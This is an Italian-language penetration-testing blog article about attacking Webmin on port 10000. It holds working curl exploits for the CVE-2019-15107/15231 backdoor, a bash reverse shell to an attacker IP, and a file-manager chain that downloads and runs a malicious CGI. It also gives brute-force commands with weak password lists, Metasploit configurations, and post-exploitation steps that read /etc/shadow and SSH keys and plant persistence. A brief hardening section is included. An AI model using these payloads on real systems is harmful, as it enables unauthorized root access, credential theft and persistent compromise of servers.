---
title: 'Porta 10000 Webmin: Backdoor RCE e Root Immediato'
slug: porta-10000-webmin
description: 'Porta 10000 Webmin: backdoor CVE-2019-15107 pre-auth RCE root, CVE-2022-0824 file manager, CVE-2024-12828 CVSS 9.9, Metasploit modules e post-exploitation con accesso root completo.'
image: /porta-10000-webmin.webp
draft: true
date: 2026-04-19T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - webmin-pentest
  - webmin-rce-root
  - porta-10000
---

Webmin è il pannello di amministrazione web per server Linux/Unix più longevo e diffuso: nato nel 1997, permette di gestire utenti, cron job, firewall, DNS, Apache, [MySQL](https://hackita.it/articoli/porta-3306-mysql), file e praticamente qualsiasi aspetto del sistema operativo — il tutto da un'interfaccia web sulla porta 10000 TCP (HTTPS con certificato self-signed). La particolarità che lo rende un target così prezioso nel penetration testing è che Webmin gira come **root**. Non come utente limitato, non come www-data: come root. Questo significa che ogni vulnerabilità in Webmin — e ne ha avute parecchie — è una vulnerabilità con privilegi massimi. Non serve escalation, non serve privilege escalation: comprometti Webmin e hai root.

La storia recente di Webmin è costellata di CVE critiche, tra cui una **backdoor inserita direttamente nel codice sorgente** (CVE-2019-15107) e una **command injection CVSS 9.9** scoperta a fine 2024 (CVE-2024-12828). Se durante un pentest trovi la porta 10000 aperta, fermati e dedicagli attenzione — le probabilità di ottenere una shell root sono alte.

Ricordo un assessment interno per un'azienda manifatturiera nel nord Italia: il sysadmin usava Webmin per gestire 12 server Debian. La versione? 1.920 — quella con la backdoor. Dodici shell root in cinque minuti, senza una singola password. È stato il pentest più breve della mia carriera.

## Cos'è Webmin — Per Chi Non lo Conosce

Webmin trasforma la gestione di un server Linux in un'esperienza da browser: invece di connetterti via [SSH](https://hackita.it/articoli/ssh) e digitare comandi, apri `https://server:10000` e fai tutto con click e form. Gestisci utenti, installi pacchetti, configuri Apache, crei cron job, modifichi file. Virtualmin (plugin) aggiunge hosting web, Usermin dà accesso limitato agli utenti non-admin. È usatissimo da piccole aziende, hosting provider, scuole e chiunque preferisca un'interfaccia grafica alla riga di comando.

```
Browser                          Server Linux
┌──────────────┐                ┌──────────────────────────────┐
│ Admin        │── HTTPS ──────►│ Webmin (:10000)              │
│ https://     │                │   miniserv.pl (Perl, root)   │
│ server:10000 │                │   ├── File Manager           │
│              │                │   ├── Command Shell          │
│              │◄── HTML/JSON ──│   ├── Users & Groups         │
│              │                │   ├── Cron Jobs              │
│              │                │   ├── Package Manager        │
│              │                │   ├── Firewall (iptables)    │
│              │                │   └── Tutti i moduli...      │
└──────────────┘                └──────────────────────────────┘
```

| Porta     | Servizio       | Note                                   |
| --------- | -------------- | -------------------------------------- |
| **10000** | Webmin (HTTPS) | Porta default, certificato self-signed |
| 20000     | Usermin        | Interfaccia per utenti non-admin       |
| 10001     | Virtualmin     | A volte su porta separata              |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 10000,20000 10.10.10.40
```

```
PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 2.105 (Webmin httpd)
```

`MiniServ` è il web server embedded di Webmin — la versione (`2.105`) è fondamentale per scegliere il CVE giusto.

### Versione esatta

```bash
curl -sk https://10.10.10.40:10000/sysinfo.cgi 2>/dev/null | grep -iE "version|webmin"

# Oppure dalla pagina di login
curl -sk https://10.10.10.40:10000/ | grep -i "ver"
```

### Verifica se la pagina di login è raggiungibile

```bash
curl -sk https://10.10.10.40:10000/session_login.cgi -I
```

Se risponde `200` → pagina di login attiva.

## 2. Credential Attack

Webmin **non ha credenziali di default hardcoded** — usa le credenziali di sistema di Linux. L'utente principale è `root` con la password del sistema operativo. Ma nel mondo reale, le password deboli sono ovunque.

| Username | Password   | Contesto           |
| -------- | ---------- | ------------------ |
| `root`   | `root`     | Lazy setup         |
| `root`   | `toor`     | Kali Linux reverse |
| `root`   | `password` | Il classico        |
| `admin`  | `admin`    | Account custom     |
| `root`   | `webmin`   | Setup veloce       |

```bash
# Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.40 https-post-form \
  "/session_login.cgi:user=^USER^&pass=^PASS^:Invalid login" -s 10000
```

```bash
# Nota: Webmin richiede il cookie testing=1 per accettare il login
curl -sk -X POST https://10.10.10.40:10000/session_login.cgi \
  -H "Cookie: testing=1" \
  -d "user=root&pass=password" -v 2>&1 | grep -i "set-cookie\|location"
```

Se ricevi un cookie `sid=` → login riuscito.

## 3. CVE — L'Arsenale

### CVE-2019-15107 / CVE-2019-15231 — La Backdoor (CVSS 9.8)

La vulnerabilità più famosa di Webmin. Un attaccante ha compromesso il server di build e ha inserito una **backdoor** direttamente nel codice Perl di `password_change.cgi`. L'input dell'utente nel parametro `expired` viene passato direttamente all'operatore `qx//` (esecuzione di comando shell). **Pre-auth, nessuna credenziale richiesta.**

**Versione 1.890** (CVE-2019-15231) — sfruttabile di default senza prerequisiti:

```bash
curl -sk -X POST https://10.10.10.40:10000/password_change.cgi \
  -d "user=root&pam=&expired=|id" \
  -H "Referer: https://10.10.10.40:10000/session_login.cgi"
```

```
uid=0(root) gid=0(root) groups=0(root)
```

RCE come root. Un comando. Nessuna password.

**Versioni 1.900-1.920** (CVE-2019-15107) — richiede `passwd_mode=2` nel config (password expiry cambio abilitato):

```bash
curl -sk -X POST https://10.10.10.40:10000/password_change.cgi \
  -d "user=root&old=|id&new1=test&new2=test"
```

```bash
# Reverse shell
curl -sk -X POST https://10.10.10.40:10000/password_change.cgi \
  -d "user=root&pam=&expired=|bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.200/4444+0>%261'"
```

```bash
# Metasploit (il modulo più usato per questa CVE)
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.10.10.40
set LHOST 10.10.10.200
set SSL true
set RPORT 10000
run
```

### CVE-2022-0824 — File Manager RCE (CVSS 8.8)

Qualsiasi utente Webmin autenticato — anche con privilegi bassi — può sfruttare il File Manager per ottenere RCE come root. Tre passaggi:

```bash
# 1. Scarica un CGI malevolo dall'attaccante
curl -sk -u user:pass -X POST 'https://10.10.10.40:10000/extensions/file-manager/http_download.cgi?module=filemin' \
  -d "link=http://10.10.10.200/shell.cgi&path=/usr/share/webmin"

# 2. Rendilo eseguibile
curl -sk -u user:pass -X POST 'https://10.10.10.40:10000/extensions/file-manager/chmod.cgi?module=filemin' \
  -d "name=shell.cgi&perms=0755&applyto=1&path=/usr/share/webmin"

# 3. Esegui
curl -sk https://10.10.10.40:10000/shell.cgi
```

Il CGI gira come root perché `miniserv.pl` è root.

```bash
# Metasploit
use exploit/linux/http/webmin_file_manager_rce
set RHOSTS 10.10.10.40
set USERNAME user
set PASSWORD pass
set SSL true
run
```

Versioni vulnerabili: \< **1.990**.

### CVE-2024-12828 — Command Injection CVSS 9.9 (la più recente)

Scoperta a fine 2024 (ZDI-24-1725), è la CVE Webmin più critica degli ultimi anni. La funzione di **autocomplete della shell** nel tema Authentic passa l'input utente senza sanitizzazione a `system()`. Un utente autenticato con qualsiasi livello di privilegio ottiene RCE come root.

Versioni vulnerabili: ≤ **2.105**. Fix: **2.111**.

### Tabella CVE completa

| CVE            | Anno | CVSS | Tipo                          | Versioni    | Fix   |
| -------------- | ---- | ---- | ----------------------------- | ----------- | ----- |
| CVE-2019-15231 | 2019 | 9.8  | Backdoor RCE (pre-auth)       | 1.890       | 1.930 |
| CVE-2019-15107 | 2019 | 9.8  | Backdoor RCE (con config)     | 1.900-1.920 | 1.930 |
| CVE-2019-12840 | 2019 | High | Package Updates RCE           | ≤1.910      | 1.920 |
| CVE-2022-0824  | 2022 | 8.8  | File Manager RCE              | \<1.990     | 1.990 |
| CVE-2022-36446 | 2022 | High | Package updates cmd injection | \<1.997     | 1.997 |
| CVE-2024-12828 | 2024 | 9.9  | CGI command injection         | ≤2.105      | 2.111 |
| CVE-2024-45692 | 2024 | 7.5  | UDP traffic loop              | \<2.202     | 2.202 |

```bash
# Scan automatico
nuclei -u https://10.10.10.40:10000 -tags webmin
searchsploit webmin
```

### Metasploit modules — lista completa

| Modulo                                          | CVE            | Auth          |
| ----------------------------------------------- | -------------- | ------------- |
| `exploit/linux/http/webmin_backdoor`            | CVE-2019-15107 | No            |
| `exploit/linux/http/webmin_packageup_rce`       | CVE-2019-12840 | Sì            |
| `exploit/linux/http/webmin_file_manager_rce`    | CVE-2022-0824  | Sì (low-priv) |
| `exploit/linux/http/webmin_package_updates_rce` | CVE-2022-36446 | Sì            |
| `auxiliary/admin/webmin/file_disclosure`        | —              | No            |

## 4. Post-Exploitation — Cosa Fare con Accesso Admin

Con accesso admin a Webmin, sei root. Ecco cosa puoi fare dalla web UI senza nemmeno aprire una shell:

**Command Shell** (`/shell/`): terminale Xterm.js nel browser, comandi eseguiti come root.

```bash
# Dal terminale Webmin
cat /etc/shadow
ssh-keygen -f /root/.ssh/id_rsa -N ""
cat /root/.ssh/id_rsa
```

**File Manager** (`/filemin/`): leggi, scrivi, upload, download qualsiasi file.

```bash
# Path da leggere
/etc/shadow              # Hash password
/root/.ssh/id_rsa        # Chiave SSH
/root/.bash_history      # Comandi con password inline
/etc/webmin/miniserv.conf # Config Webmin
```

**Cron Jobs** (`/cron/`): crea un cron persistente per reverse shell.

**Users & Groups** (`/useradmin/`): crea un utente con UID 0 (root alternativo).

**Package Manager**: installa pacchetti — incluso `ncat` o tool custom.

## 5. Detection & Hardening

* **Aggiorna** — le CVE Webmin sono devastanti e frequenti
* **Non esporre la 10000 su Internet** — solo VPN o IP whitelist
* **MFA** — Webmin supporta Google Authenticator
* **Disabilita password expiry change** — rimuovi `passwd_mode=` da `miniserv.conf`
* **Limita i moduli** — non serve il File Manager se non lo usi
* **Firewall** — `iptables -A INPUT -p tcp --dport 10000 -s ADMIN_IP -j ACCEPT`
* **Monitora** — log in `/var/webmin/miniserv.log`
* **Usa un certificato TLS valido** — il self-signed non protegge da MITM

## 6. Mini FAQ

**Webmin è sicuro da usare nel 2026?**
Sì, se aggiornato all'ultima versione (2.621+) e non esposto su Internet. Le CVE critiche sono tutte fixate, ma la storia insegna che ne arrivano di nuove regolarmente. L'alternativa è [Cockpit](https://hackita.it/articoli/porta-9090-web-console) (Red Hat), che ha una superficie di attacco più ridotta.

**La backdoor CVE-2019-15107 è ancora sfruttabile?**
Solo su versioni ≤1.920, che nel 2026 non dovrebbero esistere. Ma ne trovo ancora — soprattutto su server Debian/Ubuntu vecchi in aziende che "non toccano ciò che funziona". Controlla la versione con `nmap -sV -p 10000`.

**Posso fare pentest su Webmin senza credenziali?**
Sì: CVE-2019-15107/15231 (backdoor pre-auth) e il modulo Metasploit `auxiliary/admin/webmin/file_disclosure` funzionano senza autenticazione. Per le CVE più recenti serve almeno un account low-privilege.

## 7. Cheat Sheet Finale

| Azione       | Comando                                                                                      |
| ------------ | -------------------------------------------------------------------------------------------- |
| Nmap         | `nmap -sV -p 10000 target`                                                                   |
| Versione     | `curl -sk https://target:10000/sysinfo.cgi`                                                  |
| Brute force  | `hydra -l root -P wordlist target https-post-form "/session_login.cgi:..."`                  |
| Backdoor RCE | `curl -sk -X POST https://target:10000/password_change.cgi -d "user=root&pam=&expired=\|id"` |
| MSF backdoor | `use exploit/linux/http/webmin_backdoor`                                                     |
| MSF file mgr | `use exploit/linux/http/webmin_file_manager_rce`                                             |
| Nuclei       | `nuclei -u https://target:10000 -tags webmin`                                                |
| Searchsploit | `searchsploit webmin`                                                                        |

***

Riferimento: Webmin Security page, CVE-2019-15107, CVE-2024-12828 (ZDI-24-1725), Rapid7, HackTricks. Uso esclusivo in ambienti autorizzati.

> Webmin sulla tua rete? Verificane la versione prima che lo faccia qualcun altro: [penetration test HackIta](https://hackita.it/servizi). Per imparare l'exploitation Linux dal vivo: [formazione pratica 1:1](https://hackita.it/formazione).
